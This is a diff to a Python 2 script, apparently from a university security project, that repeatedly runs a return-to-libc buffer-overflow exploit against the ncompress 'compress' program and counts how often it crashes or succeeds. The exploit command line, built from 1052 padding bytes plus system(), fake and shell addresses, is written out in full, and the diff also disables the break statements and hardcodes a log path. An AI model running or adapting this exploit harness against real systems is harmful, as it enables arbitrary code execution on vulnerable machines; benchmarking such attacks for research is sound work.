@@ -83,31 +83,32 @@ for address in addresses:
 while i < repeat_times:
         i += 1
 
-        os.system("rm " + bench_eval_directory + "bench_log")
+        #os.system("rm " + bench_eval_directory + "bench_log")
         cmdline = source_directory + "compress `perl -e 'print \"A\"x1052 . " + "\"" + system_address + "\"" + \
         " . " + "\"" + fake_address + " . " + "\"" + " . " + "\"" + shell_address + "\"" + ";'`" + " > " + bench_eval_directory + "bench_log 2>&1 &"
         print cmdline
         
         os.system(cmdline)
-        log = open(bench_eval_directory + "bench_log","r")
+        log_file = bench_eval_directory + "bench_log"
+        log = open("/home/cs590/Desktop/repos/CS590Project/bench_tool/ncompress/bench-eval/bench_log","r")
 
         if log.read().find("File name too long") != -1:
-                print cmdline,"\t\t","POSSIBLE"
+                print "POSSIBLE"
                 attack_possible = 1;
-                break;	
+                #break;	
 
         if log.read().find("Segmentation fault") != -1:
                 print "Segmentation Fault"
                 attack_possible = 1;
-                break;	
+                #break;	
         
-         s_attempts += 1
+        s_attempts += 1
 
-         if attack_possible == 0:
-                 total_np += 1;
-                 continue
-         else:
-                 total_ok = total_ok + 1                 						
+        if attack_possible == 0:
+                total_np += 1;
+                continue
+        else:
+                total_ok = total_ok + 1                 						
 
 total_attacks = total_ok + total_some + total_fail + total_np;
 print "\n||Summary|| OK: ",total_ok," ,SOME: ",total_some," ,FAIL: ",total_fail," ,NP: ",total_np," ,Total Attacks: ",total_attacks
